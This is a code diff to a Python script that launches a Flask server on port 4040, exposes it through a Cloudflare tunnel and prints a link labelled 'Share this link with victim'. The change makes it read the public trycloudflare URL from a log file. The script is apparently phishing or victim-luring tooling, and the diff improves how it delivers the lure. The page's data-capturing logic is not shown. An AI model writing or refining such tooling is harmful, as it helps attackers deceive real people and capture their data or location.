@@ -1,7 +1,6 @@
 import os
 import time
-import requests
-import subprocess
+import re
 from flask import Flask, request
 
 # ─────────────────────────────────────────────
@@ -29,24 +28,27 @@ def youtube_redirect():
 
 def start_server():
     print("\n\033[96m[•] Installing requirements...\033[0m")
-    os.system("pip install flask requests > /dev/null 2>&1")
+    os.system("pip install flask > /dev/null 2>&1")
 
     print("\033[96m[•] Starting Flask server...\033[0m")
     os.system("nohup flask run --host=0.0.0.0 --port=4040 &")
 
     print("\033[96m[•] Starting Cloudflare tunnel...\033[0m")
     os.system("nohup cloudflared tunnel --url http://localhost:4040 > tunnel.log 2>&1 &")
-    time.sleep(5)
+    time.sleep(6)
 
-    # Get the tunnel URL from Cloudflare API
+    # Read the public URL from tunnel.log
     try:
-        response = requests.get("http://127.0.0.1:4040/api/tunnels")
-        tunnels = response.json()["tunnels"]
-        public_url = tunnels[0]["public_url"]
-        print(f"\n\033[92m[✓] Server & Tunnel running.\033[0m")
-        print(f"\033[92m[✓] Share this link with victim:\033[0m \033[1;91m{public_url}/sms\033[0m\n")
-    except:
-        print("\033[91m[!] Failed to get Cloudflare URL. Check if tunnel is running properly.\033[0m")
+        with open("tunnel.log", "r") as log_file:
+            log_data = log_file.read()
+            urls = re.findall(r"https://[-a-z0-9]+\.trycloudflare\.com", log_data)
+            if urls:
+                print(f"\n\033[92m[✓] Server & Tunnel running.\033[0m")
+                print(f"\033[92m[✓] Share this link with victim:\033[0m \033[1;91m{urls[0]}/sms\033[0m\n")
+            else:
+                print("\033[91m[!] Tunnel URL not found in log. Try restarting cloudflared.\033[0m")
+    except FileNotFoundError:
+        print("\033[91m[!] tunnel.log not found. Cloudflared might not have started properly.\033[0m")
 
 if __name__ == "__main__":
     os.system("clear")
